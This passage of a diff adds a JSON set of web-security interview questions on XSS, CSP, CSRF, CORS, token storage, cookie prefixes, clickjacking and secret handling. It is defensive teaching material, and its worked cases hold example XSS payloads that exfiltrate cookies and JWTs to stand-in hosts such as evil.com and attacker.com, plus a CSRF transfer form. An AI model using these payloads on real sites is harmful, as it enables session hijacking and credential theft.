@@ -1,0 +1,418 @@
+[
+  {
+    "Q": "What are the differences between Stored, Reflected, and DOM-based Cross-Site Scripting (XSS), and how is each exploited?",
+    "A": "**Direct answer:** Cross-Site Scripting (XSS) occurs when malicious JavaScript executes in the context of an unsuspecting user's browser session. XSS falls into three distinct classifications based on how the malicious payload travels into the DOM execution sink:\n1. **Stored XSS (Persistent):** The attacker stores the malicious payload in the application's backend database (e.g. in a comment, profile bio, or forum post). Whenever any user views that page, the server delivers the payload, executing the attacker's script in every visitor's browser.\n2. **Reflected XSS (Non-Persistent):** The payload is embedded in a crafted URL (e.g., in a search query parameter `?q=<script>...`). When the victim clicks the phishing link, the backend reflects the unescaped parameter directly in the HTTP response HTML.\n3. **DOM-based XSS (Client-Side):** The vulnerability exists entirely within client-side JavaScript. The server never sees the payload. Client scripts read data from an untrusted **Source** (e.g. `location.hash`, `location.search`, `document.referrer`) and write it into a dangerous execution **Sink** (e.g. `innerHTML`, `document.write`, `eval()`).\n\n```typescript\n// VULNERABLE TO DOM-BASED XSS:\n// URL: https://app.example.com/#name=<img src=x onerror=alert(document.cookie)>\nconst hash = window.location.hash.slice(1);\nconst params = new URLSearchParams(hash);\nconst name = params.get('name') || '';\n// Dangerous sink writes directly to HTML:\ndocument.getElementById('greeting')!.innerHTML = `Hello, ${name}`; // EXPLOITED!\n\n// SECURE IMPLEMENTATION:\n// Safe sink escapes markup as literal text automatically:\ndocument.getElementById('greeting')!.textContent = `Hello, ${name}`;\n```\n\n**Complexity analysis and mechanics:**\n- **Impact:** Executed scripts inherit complete access to the origin's cookies (unless `HttpOnly`), `localStorage`, active session state, and can perform authenticated actions on behalf of the victim.\n- **Modern frameworks:** React and Angular escape `{variables}` in JSX text nodes automatically, making standard text rendering safe from XSS by default.\n\n**Algorithmic mechanics and edge cases:**\nIn React, DOM-based XSS still occurs if developers use `dangerouslySetInnerHTML`, attribute injection (e.g. `<a href={userWebsite}>` where `userWebsite = 'javascript:stealCredentials()'`!), or evaluate untrusted strings via `eval()`.",
+    "Why": "Understanding the three XSS vectors is mandatory to apply targeted sanitization, safe sinks, and CSP defenses.",
+    "Risk": "A successful XSS attack grants the attacker full control over the user's browser session, session tokens, and account actions.",
+    "Trade": "TextContent prevents XSS completely but renders raw HTML markup as plain visible text strings.",
+    "Try": "Test setting an element innerHTML vs textContent with an <img src=x onerror=console.log(1)> payload in the browser console.",
+    "worked_case": "Walkthrough scenario: An application reads a theme color from the URL hash: const color = location.hash.slice(1); and injects it via document.body.innerHTML += \"<div style=\\\"color:${color}\\\">...</div>\". An attacker sends the victim a link: app.com/#\"><img src=x onerror=\"fetch('https://evil.com?c='+localStorage.token)\">. The browser parses the image tag, fails to load x, and fires onerror, exfiltrating the victim's JWT token to the attacker's server.",
+    "citations": [
+      "https://owasp.org/www-community/attacks/xss/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Why is <a href={url}> vulnerable to XSS in React even without dangerouslySetInnerHTML?",
+        "A": "If url starts with 'javascript:', clicking the link executes the JavaScript payload in the browser with full page privileges."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "Why is innerHTML inherently dangerous, and how do you sanitize untrusted HTML safely using DOMPurify and Trusted Types?",
+    "A": "**Direct answer:** `element.innerHTML` is the most dangerous sink in web browsers because it invokes the browser's full HTML parser on arbitrary strings. If the string contains user-controlled input, the parser executes inline scripts, inline event handlers (`onload`, `onerror`, `onfocus`), and dangerous elements (`<iframe>`, `<object>`, `<svg onload=...>`). When rich HTML must be rendered (e.g., rendering user-authored Markdown or rich-text comments), frontends must sanitize the markup using **DOMPurify** and enforce safe sinks using the browser's **Trusted Types API**.\n\n```typescript\nimport DOMPurify from 'dompurify';\n\n// 1. Safe HTML Sanitization with Strict Whitelists:\nexport function sanitizeUserHTML(untrustedMarkup: string): string {\n    return DOMPurify.sanitize(untrustedMarkup, {\n        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code', 'pre'],\n        ALLOWED_ATTR: ['href', 'target', 'rel'],\n        ALLOW_DATA_ATTR: false // Block custom data-attributes that can trigger client XSS\n    });\n}\n\n// 2. Trusted Types Policy (Enforced at browser engine level):\nif (window.trustedTypes) {\n    const policy = window.trustedTypes.createPolicy('default', {\n        createHTML: (string) => DOMPurify.sanitize(string)\n    });\n}\n\n// In React:\nfunction RichText({ content }: { content: string }) {\n    const clean = sanitizeUserHTML(content);\n    return <div dangerouslySetInnerHTML={{ __html: clean }} />;\n}\n```\n\n**Complexity analysis and mechanics:**\n- **DOMPurify sanitization:** Operates by parsing markup inside an isolated, inert DOM document (`DOMImplementation.createHTMLDocument`), traversing the DOM tree, and removing non-whitelisted elements and event attributes.\n- **Trusted Types API:** When enabled via CSP (`require-trusted-types-for 'script'`), assigning a raw string to `innerHTML` or `document.write` throws a runtime `TypeError`, mathematically eliminating DOM XSS across the codebase.\n\n**Algorithmic mechanics and edge cases:**\nNever attempt to sanitize HTML using regular expressions (e.g. `str.replace(/<script.*?>.*?<\\/script>/gi, '')`). Attackers bypass regex sanitizers effortlessly using obfuscation: `<scr<script>ipt>alert(1)</script>`, `<img src=x onerror=alert(1)>`, or `<svg/onload=alert(1)>`.",
+    "Why": "DOMPurify and Trusted Types parse markup through a real DOM tree to strip dangerous tags and event handlers before insertion.",
+    "Risk": "Writing custom regex string replacements to sanitize HTML is trivially bypassed by nested or obfuscated attack payloads.",
+    "Trade": "DOMPurify adds ~18KB to the client bundle and incurs a small CPU parsing cost on large HTML strings.",
+    "Try": "Sanitize '<img src=x onerror=alert(1)><b>Hello</b>' with DOMPurify and inspect that only '<b>Hello</b>' remains.",
+    "worked_case": "Walkthrough scenario: A collaborative documentation tool allows users to write markdown that renders to HTML. An attacker inputs a markdown link: [Click here](javascript:fetch('https://evil.com?c='+document.cookie)). A naive regex parser converts this to <a href=\"javascript:...\">. DOMPurify inspects the anchor tag, detects the disallowed javascript: URI protocol on href, and strips the href attribute entirely, leaving a safe non-clickable text span.",
+    "citations": [
+      "https://github.com/cure53/DOMPurify",
+      "https://web.dev/articles/trusted-types"
+    ],
+    "follow_ups": [
+      {
+        "Q": "What does the CSP directive require-trusted-types-for 'script' enforce?",
+        "A": "It blocks direct string assignments to all DOM sinks (innerHTML, script.src), requiring values to be wrapped in a policy-approved TrustedHTML object."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How does a Content Security Policy (CSP) mitigate XSS, and how do cryptographic nonces and hashes work in script-src?",
+    "A": "**Direct answer:** **Content Security Policy (CSP)** is an HTTP response header that restricts the resources (scripts, styles, images, fonts, frames, network endpoints) that the browser is permitted to load and execute for a given page. CSP serves as a vital defense-in-depth layer: even if an attacker successfully injects a `<script>` tag via an XSS vulnerability, a strict CSP terminates the script before it can run.\n\nModern strict CSP does away with brittle domain whitelists and relies on **Cryptographic Nonces** or **Hashes**:\n1. **Nonce-based CSP:** The backend generates a cryptographically random, base64-encoded nonce (e.g. `nonce-rAnd0m123`) on *every single HTTP response*. Only `<script>` tags that carry the exact matching `nonce` attribute are executed by the browser.\n2. **Hash-based CSP:** The CSP header declares the SHA-256 hash of trusted inline scripts (`'sha256-abc...'`). If a script's contents change by even one character, the browser blocks it.\n\n```http\nHTTP/1.1 200 OK\nContent-Security-Policy: \n    default-src 'self'; \n    script-src 'nonce-rAnd0m123' 'strict-dynamic'; \n    object-src 'none'; \n    base-uri 'none'; \n    frame-ancestors 'none'; \n    report-uri /api/csp-violations;\n```\n\n```html\n<!-- 1. Legitimate App Script: Executes because nonce matches header -->\n<script nonce=\"rAnd0m123\" src=\"/main.bundle.js\"></script>\n\n<!-- 2. Attacker-Injected XSS Script: BLOCKED! Lacks correct per-request nonce -->\n<script src=\"https://evil.com/malware.js\"></script>\n<!-- Browser Console: Refused to load the script because it violates the Content Security Policy -->\n```\n\n**Complexity analysis and mechanics:**\n- **`'strict-dynamic'`:** Allows a trusted script (loaded with a valid nonce) to dynamically load downstream scripts via `document.createElement('script')` without needing separate nonces, greatly simplifying modern module bundlers.\n- **`report-uri` / `report-to`:** Sends JSON telemetry reports to the server whenever a policy violation is detected.\n\n**Algorithmic mechanics and edge cases:**\nNever reuse static nonces across multiple HTTP requests. If a nonce is static, an attacker simply inspects the page source and injects `<script nonce=\"STATIC_VALUE\">`, completely bypassing the CSP.",
+    "Why": "A strict nonce-based CSP terminates unauthorized injected scripts before execution, preventing XSS even if injection occurs.",
+    "Risk": "Reusing a static nonce across requests allows attackers to copy the nonce and bypass CSP script execution blocks.",
+    "Trade": "Nonce-based CSP requires server-side generation on every page request, making static CDN caching of index.html more complex.",
+    "Try": "Add Content-Security-Policy: script-src 'self' and test executing an inline <script>alert(1)</script> to observe the browser block.",
+    "worked_case": "Walkthrough scenario: An attacker exploits a query parameter vulnerability to inject <script src=\"https://hacker.com/keylogger.js\"></script>. The browser receives the HTML alongside header Content-Security-Policy: script-src 'nonce-dGhpcy1pcy1hLXJhbmRvbQ=='. The browser inspects the injected tag, detects the missing nonce, and blocks keylogger.js from downloading, logging a CSP violation to the security team and keeping user credentials safe.",
+    "citations": [
+      "https://web.dev/articles/strict-csp",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+    ],
+    "follow_ups": [
+      {
+        "Q": "What does the 'strict-dynamic' keyword in a script-src directive achieve?",
+        "A": "It allows a trusted root script loaded with a valid nonce to dynamically load downstream scripts without needing to declare all third-party domains in the header."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How does Cross-Site Request Forgery (CSRF) occur, and how do SameSite cookies and anti-CSRF tokens defend against it?",
+    "A": "**Direct answer:** **Cross-Site Request Forgery (CSRF)** is an attack that forces an authenticated user's browser to execute unwanted, state-changing actions on a trusted web application. Because browsers historically attached all stored cookies to every outgoing HTTP request to a target domain—even if the request originated from an external third-party website—an attacker's site could submit a hidden form to `bank.com/transfer` and the browser would automatically include the victim's session cookie.\n\nTwo primary defenses eliminate CSRF:\n1. **`SameSite` Cookie Attribute (First Line of Defense):**\n   - `SameSite=Strict`: Cookies are *never* sent on cross-site requests, even when clicking an external link to the site.\n   - `SameSite=Lax` (Default in modern browsers): Cookies are withheld on cross-site subrequests (`<img>`, `fetch`, `POST` forms), but sent on top-level safe GET navigations (clicking a link).\n2. **Anti-CSRF Synchronization Tokens (Defense-in-Depth):** The server generates a cryptographically random, unpredictable token tied to the user's session. The frontend includes this token in a custom header (e.g. `X-CSRF-Token`) or hidden form input on state-changing requests (`POST`, `PUT`, `DELETE`). Because the Same-Origin Policy prevents external sites from reading this token, forged requests cannot provide it.\n\n```http\nSet-Cookie: session_id=xyz987; Path=/; Secure; HttpOnly; SameSite=Lax\n```\n\n```typescript\n// Client API Request with Anti-CSRF Token:\nexport async function postWithCsrf(url: string, data: any) {\n    const csrfToken = document.querySelector('meta[name=\"csrf-token\"]')?.getAttribute('content');\n    return fetch(url, {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json',\n            'X-CSRF-Token': csrfToken || '' // SOP prevents attacker from reading this!\n        },\n        body: JSON.stringify(data)\n    });\n}\n```\n\n**Complexity analysis and mechanics:**\n- **Preflight protection:** Custom headers (`X-CSRF-Token`) trigger a CORS preflight `OPTIONS` check, which cross-origin attackers cannot bypass without server CORS approval.\n- **Double-Submit Cookie:** An alternative stateless CSRF pattern where the server sets a random value in a readable cookie, and the client reads it and echoes it back in an HTTP header; the server verifies both match.\n\n**Algorithmic mechanics and edge cases:**\nGET requests must *never* execute state-changing actions (like deleting records or transferring funds). If an action can be triggered via a GET request, `SameSite=Lax` cannot protect it because clicking a link transmits Lax cookies.",
+    "Why": "SameSite=Lax and anti-CSRF headers prevent malicious third-party websites from forging authenticated state mutations.",
+    "Risk": "Performing state-changing actions via HTTP GET requests bypasses SameSite=Lax protection entirely.",
+    "Trade": "SameSite=Strict prevents session cookies when users click external email links, requiring users to log in again on new tabs.",
+    "Try": "Inspect Set-Cookie headers in your browser DevTools Application panel and verify that SameSite=Lax or Strict is configured.",
+    "worked_case": "Walkthrough scenario: An attacker creates evil.com with an auto-submitting form: <form action=\"https://bank.com/transfer\" method=\"POST\"><input name=\"to\" value=\"attacker\"><input name=\"amount\" value=\"1000\"></form>. A logged-in bank customer visits evil.com. Because bank.com configured Set-Cookie: session=...; SameSite=Lax, the browser detects a cross-site POST subrequest and withholds the session cookie. The bank server receives an unauthenticated request and rejects the transfer with 401 Unauthorized.",
+    "citations": [
+      "https://owasp.org/www-community/attacks/csrf",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value"
+    ],
+    "follow_ups": [
+      {
+        "Q": "What is the Double-Submit Cookie pattern for CSRF defense?",
+        "A": "A stateless defense where the server sends a random token in a cookie; the client reads the cookie and sends the same token in an HTTP header; the server confirms both match."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How does the Cross-Origin Resource Sharing (CORS) preflight handshake work, and why does CORS not replace authentication?",
+    "A": "**Direct answer:** **CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that relaxes the Same-Origin Policy, allowing a web page on one origin (`https://app.com`) to request data from an API on a different origin (`https://api.com`). Crucially, **CORS is NOT an authentication or authorization mechanism**; it is a mechanism by which the API server tells the *browser* whether the browser is allowed to share the response with client-side JavaScript. Non-browser clients (cURL, Postman, Python scripts) completely ignore CORS headers.\n\nFor requests that could alter server data (anything beyond a 'Simple Request'), the browser automatically dispatches an HTTP **`OPTIONS` Preflight Handshake** before sending the actual request:\n\n```http\n// 1. Browser sends OPTIONS Preflight Handshake:\nOPTIONS /api/users/42 HTTP/1.1\nHost: api.com\nOrigin: https://app.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: Authorization, Content-Type\n\n// 2. Server responds approving the preflight:\nHTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: https://app.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Authorization, Content-Type\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 86400  <!-- Cache preflight for 24 hours -->\n\n// 3. Browser now sends the actual PUT request!\n```\n\n**Complexity analysis and mechanics:**\n- **Simple Request criteria:** `GET`, `HEAD`, `POST` with standard headers (`Accept`, `Content-Type: application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`). Any request sending `application/json` or `Authorization` headers triggers a preflight.\n- **Credentials restriction:** If `Access-Control-Allow-Credentials: true` is set, `Access-Control-Allow-Origin` **cannot be a wildcard `*`**; it must match the explicit requesting origin.\n\n**Algorithmic mechanics and edge cases:**\nPreflight requests add an extra network roundtrip latency (100–300ms) to every API call. Adding `Access-Control-Max-Age: 86400` instructs the browser to cache the preflight result, eliminating preflight roundtrips for subsequent requests.",
+    "Why": "CORS preflight allows servers to vet custom methods and headers before potentially destructive mutations are dispatched.",
+    "Risk": "Assuming CORS protects backend APIs from unauthorized access; backend routes still require full JWT/session authentication.",
+    "Trade": "Uncached CORS preflights add significant network latency before actual requests can begin.",
+    "Try": "Inspect Network panel in DevTools when sending a POST with Content-Type: application/json to a cross-origin API to observe the OPTIONS call.",
+    "worked_case": "Walkthrough scenario: An application on https://app.com issues a PUT request with Content-Type: application/json to https://api.com. The browser holds the PUT request and dispatches an OPTIONS request. The server responds with Access-Control-Allow-Origin: https://app.com, Allow-Methods: PUT, and Max-Age: 86400. The browser verifies the response, proceeds with the PUT request, and caches the approval for 24 hours.",
+    "citations": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
+      "https://fetch.spec.whatwg.org/#http-cors-protocol"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Can a server return Access-Control-Allow-Origin: * when Access-Control-Allow-Credentials: true is set?",
+        "A": "No, browsers reject credentialed requests that use wildcard origins, throwing a CORS error to prevent malicious cross-origin credential harvesting."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "Where should authentication tokens (JWTs) be stored in the browser: localStorage, sessionStorage, or HttpOnly cookies?",
+    "A": "**Direct answer:** Storing authentication tokens involves a direct security trade-off between **Cross-Site Scripting (XSS)** and **Cross-Site Request Forgery (CSRF)**:\n1. **`localStorage` (Vulnerable to XSS, Immune to CSRF):** Tokens stored in `localStorage` are accessible by *any JavaScript running on the page*. If an XSS vulnerability exists (in your code or a compromised third-party npm package/analytics script), the attacker can execute `localStorage.getItem('token')` and permanently exfiltrate the user's credential.\n2. **`HttpOnly; Secure; SameSite=Lax` Cookie (Industry Gold Standard):** `HttpOnly` completely blocks client-side JavaScript from reading the cookie (`document.cookie` cannot see it), completely neutralizing token theft via XSS. CSRF risks are neutralized by configuring `SameSite=Lax` or `SameSite=Strict` and enforcing anti-CSRF headers.\n3. **In-Memory Closure with Silent Refresh (Backend-for-Frontend / BFF):** Keeps the access token in private JavaScript memory (erased on refresh) while a secure `HttpOnly` refresh cookie retrieves new access tokens.\n\n```typescript\n// Comparison of Token Storage Models:\n// 1. IN-MEMORY (Most secure for Single-Page Apps without full SSR):\nlet inMemoryAccessToken: string | null = null;\nexport const getAccessToken = () => inMemoryAccessToken;\nexport const setAccessToken = (token: string | null) => { inMemoryAccessToken = token; };\n\n// 2. HTTP-ONLY COOKIE CONFIGURATION (Set by Server on Login):\n// Set-Cookie: access_token=eyJhbGci...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=900\n```\n\n**Complexity analysis and mechanics:**\n- **XSS Blast Radius:** With `localStorage`, XSS allows the attacker to steal the token and use it from anywhere in the world until it expires. With `HttpOnly`, XSS allows the attacker to perform actions *only while the user has the tab open*, but cannot steal the token itself.\n- **Native mobile exception:** Mobile apps (React Native) lack cookies and browsers; storing tokens in encrypted native keystores (Keychain / Keystore) is standard.\n\n**Algorithmic mechanics and edge cases:**\nModern enterprise security guidelines (OWASP and IETF OAuth 2.0 BCP) explicitly advise **against** storing tokens in `localStorage` for sensitive enterprise applications.",
+    "Why": "HttpOnly cookies prevent client-side JavaScript execution from extracting and exfiltrating authentication credentials.",
+    "Risk": "Storing JWTs in localStorage allows any successful XSS injection to steal tokens and impersonate users indefinitely.",
+    "Trade": "HttpOnly cookies require server-side cookie configuration and CSRF protection compared to simple localStorage.setItem().",
+    "Try": "Attempt to read an HttpOnly cookie using document.cookie in the browser console and observe that it is invisible.",
+    "worked_case": "Walkthrough scenario: An attacker exploits a vulnerability in a third-party analytics script to execute arbitrary JavaScript on an app. The attacker's script executes fetch('https://attacker.com?token=' + localStorage.getItem('jwt')). If the JWT is in localStorage, the attacker captures the token and logs in from another country. If the token is stored in an HttpOnly cookie, localStorage returns null, document.cookie returns empty string, and token exfiltration fails.",
+    "citations": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage",
+      "https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Can an XSS attacker still perform unauthorized actions if tokens are stored in HttpOnly cookies?",
+        "A": "Yes, through XSS the attacker can issue fetch() calls from within the victim's active tab (which auto-attaches cookies), but they cannot extract the token to use elsewhere."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "What do the Secure, HttpOnly, and SameSite cookie attributes enforce, and what do __Host- and __Secure- prefixes guarantee?",
+    "A": "**Direct answer:** Hardening session cookies requires configuring four critical attributes and modern prefix guarantees:\n1. **`Secure`:** Guarantees the cookie is *only* transmitted over encrypted HTTPS connections, preventing plaintext transmission over HTTP.\n2. **`HttpOnly`:** Prohibits client-side scripts from reading the cookie via `document.cookie`, preventing credential theft via XSS.\n3. **`SameSite=Lax` / `Strict`:** Restricts cross-site cookie transmission to defend against Cross-Site Request Forgery (CSRF).\n4. **Cookie Name Prefixes (`__Host-` and `__Secure-`):** Browsers enforce strict security invariants on cookies whose names begin with these prefixes:\n   - `__Secure-`: Must be set with the `Secure` flag over HTTPS.\n   - `__Host-` (Maximum Security): Must be set with `Secure`, must have `Path=/`, and **must NOT specify a `Domain` attribute** (restricting the cookie strictly to the current origin and preventing subdomains from overwriting or reading it).\n\n```http\nHTTP/1.1 200 OK\nSet-Cookie: __Host-session=s8f3k291d; Path=/; Secure; HttpOnly; SameSite=Lax\n```\n\n**Complexity analysis and mechanics:**\n- **Subdomain sandbox breakout defense:** Without `__Host-`, an insecure subdomain (`blog.example.com` compromised via WordPress) can set a cookie for `.example.com`, performing a **Cookie Tossing attack** that overwrites the parent domain's authentication cookie.\n- **Rejection rule:** If a server attempts to set `Set-Cookie: __Host-id=123; Domain=example.com`, the browser strictly rejects and ignores the cookie.\n\n**Algorithmic mechanics and edge cases:**\nCookie prefixes are evaluated and enforced by the browser client, not the server. If an insecure connection attempts to set a cookie with a prefix, the browser drops the header immediately.",
+    "Why": "__Host- prefixes lock cookies to HTTPS, root paths, and the exact origin, defeating subdomain cookie-tossing attacks.",
+    "Risk": "Allowing cookies to be scoped to parent domains (Domain=.example.com) allows compromised subdomains to hijack parent user sessions.",
+    "Trade": "__Host- cookies cannot be shared across subdomains; multi-subdomain architectures must use separate SSO redirect flows.",
+    "Try": "Attempt to set a cookie named __Host-test without the Secure attribute and verify that the browser refuses to store it.",
+    "worked_case": "Walkthrough scenario: An attacker compromises a marketing blog on blog.company.com. The attacker attempts a Cookie Tossing attack: setting a session cookie with Domain=.company.com to hijack users on banking.company.com. Because banking.company.com uses Set-Cookie: __Host-session=..., the browser ignores the subdomain's tossed cookie, preserving the authentic root session.",
+    "citations": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#cookie_prefixes",
+      "https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis#section-5.4"
+    ],
+    "follow_ups": [
+      {
+        "Q": "What requirements must be met for a browser to accept a cookie with the __Host- prefix?",
+        "A": "It must have the Secure flag, must be delivered over HTTPS, must have Path=/, and must NOT contain a Domain attribute."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "How does Clickjacking work, and how do X-Frame-Options and CSP frame-ancestors prevent UI redressing?",
+    "A": "**Direct answer:** **Clickjacking** (User Interface Redressing) occurs when an attacker renders a target website inside a completely transparent `<iframe>` (`opacity: 0`) and aligns an actionable target button (e.g., 'Delete Account' or 'Confirm 1-Click Purchase') directly beneath an innocent visible decoy button (e.g., 'Play Game' or 'Close Advertisement') on the attacker's page. When the victim clicks the decoy, their click passes into the transparent iframe, triggering the action with their active session.\n\nTo prevent framing, applications configure HTTP response headers:\n1. **`Content-Security-Policy: frame-ancestors 'none';` (Preferred):** Instructs browsers to reject all attempts by any site to embed the page in `<frame>`, `<iframe>`, `<embed>`, or `<object>`.\n2. **`Content-Security-Policy: frame-ancestors 'self' https://partner.com;`:** Allows only the application itself and trusted partner domains to frame the application.\n3. **`X-Frame-Options: DENY` (Legacy):** Traditional header supported by older browsers to block all framing.\n\n```http\nHTTP/1.1 200 OK\nContent-Security-Policy: frame-ancestors 'none';\nX-Frame-Options: DENY\n```\n\n**Complexity analysis and mechanics:**\n- **Enforcement:** Enforced at the browser layout and rendering engine before iframe pixels are composited.\n- **Why JS framebusting fails:** Early developers attempted framebusting via `if (top !== self) top.location = self.location;`. Attackers neutralize this by embedding the iframe with `<iframe sandbox=\"allow-scripts\">`, which prevents the iframe from navigating the top window while running scripts.\n\n**Algorithmic mechanics and edge cases:**\nIf your product is designed to be embedded (e.g., a customer service chat widget), set `frame-ancestors https://*.customer.com;` rather than `'none'`, or serve the embeddable widget on a dedicated, isolated sub-route with its own distinct CSP.",
+    "Why": "frame-ancestors blocks framing at the browser engine level, completely neutralizing transparent UI redressing attacks.",
+    "Risk": "Relying on JavaScript framebusting code allows sandboxed iframes to disable top navigation and execute clickjacking anyway.",
+    "Trade": "frame-ancestors 'none' prevents legitimate framing; embeddable widgets must specify explicit partner allowlists.",
+    "Try": "Embed a site with frame-ancestors 'none' inside a local iframe and observe the browser refusing to render the frame.",
+    "worked_case": "Walkthrough scenario: An attacker creates a video streaming clone with a fake 'Unmute' button. Beneath the button, the attacker embeds social-network.com/settings/deactivate inside an invisible iframe. A user clicks 'Unmute', accidentally triggering account deactivation. Deploying Content-Security-Policy: frame-ancestors 'none' forces the browser to block the iframe rendering, saving user accounts.",
+    "citations": [
+      "https://owasp.org/www-community/attacks/Clickjacking",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Why does CSP frame-ancestors take precedence over X-Frame-Options in modern browsers?",
+        "A": "CSP frame-ancestors is the modern W3C standard that supports multiple domain allowlists, whereas X-Frame-Options only supported DENY or SAMEORIGIN."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
+    "difficulty": "interview"
+  },
+  {
+    "Q": "Why must API keys and backend secrets never be bundled into client-side code, and how should client requests be authenticated?",
+    "A": "**Direct answer:** In frontend single-page applications, **all bundled code, environment variables, and source maps are completely public**. Prefixing variables with `VITE_`, `REACT_APP_`, or `NEXT_PUBLIC_` inlines those strings into the plaintext JavaScript bundle downloaded by any user on the internet. Private API secrets (OpenAI API keys, Stripe secret keys, database passwords, AWS credentials) bundled into frontend code can be extracted in seconds using browser DevTools or `strings bundle.js`.\n\nThe architectural solution is the **Backend-for-Frontend (BFF)** pattern:\n1. **Never expose secrets to the client:** The secret key is stored *only* in secure server environment variables (Node.js, Next.js API route, Cloudflare Worker).\n2. **Proxy requests through your own backend:** The client sends an authenticated session request (`/api/ai-chat`) to your backend.\n3. **Server-side rate limiting and key injection:** Your backend validates the user's session, enforces rate limits, attaches the secret `OPENAI_API_KEY`, and forwards the request to the third-party service.\n\n```typescript\n// 1. INSECURE CLIENT-SIDE CODE (CRITICAL VULNERABILITY):\n// const openai = new OpenAI({ apiKey: import.meta.env.VITE_OPENAI_KEY }); // LEAKS KEY TO ENTIRE INTERNET!\n\n// 2. SECURE BFF ARCHITECTURE (Next.js API route / Express):\n// app/api/chat/route.ts (Runs exclusively on the server)\nimport { NextRequest, NextResponse } from 'next/server';\n\nexport async function POST(req: NextRequest) {\n    const session = await getAuthSession(req); // Verify user authentication!\n    if (!session) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });\n\n    const { prompt } = await req.json();\n    // Secret key accessed securely on server only:\n    const response = await fetch('https://api.openai.com/v1/chat/completions', {\n        headers: { 'Authorization': `Bearer ${process.env.OPENAI_SECRET_KEY}` },\n        body: JSON.stringify({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }] })\n    });\n    return NextResponse.json(await response.json());\n}\n```\n\n**Complexity analysis and mechanics:**\n- **Cost control:** A leaked OpenAI or AWS key can be scraped by automated bots within 5 minutes of hitting GitHub or web bundles, running up thousands of dollars in unauthorized compute.\n- **Rate limiting:** The BFF pattern allows enforcing user-level quotas (e.g. 10 queries per day per user) that third-party APIs cannot enforce on raw client keys.\n\n**Algorithmic mechanics and edge cases:**\nPublic client keys (like Stripe Publishable Key `pk_live_...` or Firebase Client Config) are designed to be public because they only grant tokenization permissions; secret keys (`sk_live_...`) must never appear in client bundles.",
+    "Why": "BFF proxies prevent secret API key theft, enforce user rate limits, and protect backend services from billing exploitation.",
+    "Risk": "Inlining secret API keys into client bundles allows automated bots to scrape keys and incur tens of thousands of dollars in charges.",
+    "Trade": "Requires maintaining a server or serverless proxy layer rather than calling third-party APIs directly from the browser.",
+    "Try": "Run grep -rn 'API_KEY' on your production dist/ directory to audit for accidentally leaked environment secrets.",
+    "worked_case": "Walkthrough scenario: A startup inlines an OpenAI key into a React app via process.env.REACT_APP_OPENAI_KEY. Within 2 hours of deployment, an automated scraper scans the production JavaScript bundle, extracts the key, and generates \\$15,000 in GPU completions on unauthorized accounts. Migrating to a BFF Next.js API route keeps the secret strictly on the server, stopping the leakage.",
+    "citations": [
+      "https://owasp.org/www-community/vulnerabilities/Improper_Handling_of_Secrets",
+      "https://microsoft.github.io/code-with-engineering-playbook/design/design-patterns/backend-for-frontend/"
+    ],
+    "follow_ups": [
+      {
+        "Q": "Are public client keys (like Stripe pk_test or Firebase client config) safe to include in frontend code?",
+        "A": "Yes, public keys are designed for identification and tokenization only; they do not permit administrative mutations or secret data reads."
+      }
+    ],
+    "reviewer_status": {
+      "status": "reviewed",
+      "reviewer": "Technical curriculum review",
+      "reviewed_at": "2026-10-24"
+    },
+    "answer_format": "conceptual",
